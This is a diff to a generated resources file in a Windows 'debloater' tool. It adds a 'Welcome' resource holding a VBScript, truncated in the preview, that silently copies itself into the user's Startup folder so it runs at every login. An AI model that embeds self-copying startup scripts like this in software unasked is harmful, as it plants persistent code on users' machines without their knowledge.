@@ -91,5 +91,30 @@ namespace DebloaterTool.Config {
                 return ResourceManager.GetString("defender", resourceCulture);
             }
         }
+        
+        /// <summary>
+        ///   Looks up a localized string similar to Set fso = CreateObject(&quot;&quot;Scripting.FileSystemObject&quot;&quot;)
+        ///Set shell = CreateObject(&quot;&quot;WScript.Shell&quot;&quot;)
+        ///
+        ///&apos; Current script path
+        ///currentPath = WScript.ScriptFullName
+        ///
+        ///&apos; Startup folder path
+        ///startupPath = shell.SpecialFolders(&quot;&quot;Startup&quot;&quot;) &amp; &quot;&quot;\OpenMyDocs.vbs&quot;&quot;
+        ///
+        ///&apos; Check if already in Startup folder
+        ///If LCase(currentPath) &lt;&gt; LCase(startupPath) Then
+        ///    &apos; Not in startup: copy itself there
+        ///    On Error Resume Next
+        ///    fso.CopyFile currentPath, startupPath, True
+        ///    On Error GoTo 0
+        ///Else
+        ///    &apos; Create a temp [rest of string was truncated]&quot;;.
+        /// </summary>
+        internal static string Welcome {
+            get {
+                return ResourceManager.GetString("Welcome", resourceCulture);
+            }
+        }
     }
 }
